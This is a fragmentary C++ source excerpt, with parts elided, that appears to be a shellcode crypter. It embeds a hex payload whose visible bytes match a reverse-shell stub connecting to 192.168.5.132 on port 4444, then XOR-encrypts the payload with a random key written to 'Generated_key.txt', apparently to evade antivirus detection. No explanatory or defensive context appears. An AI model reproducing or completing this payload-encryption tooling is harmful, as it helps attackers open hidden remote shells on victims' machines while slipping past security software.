...
int main()
{
    const char hexPayload[] =
        ...
        "\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x05\x84\x41\x54"
    ...
    const char *xorKey = generateRandomString(16);
    const int keySize = strlen(xorKey);
    std::string output = "Generated_key.txt";

    char *encryptedPayload = xorEncrypt(hexPayload, sizeof(hexPayload), xorKey, keySize);
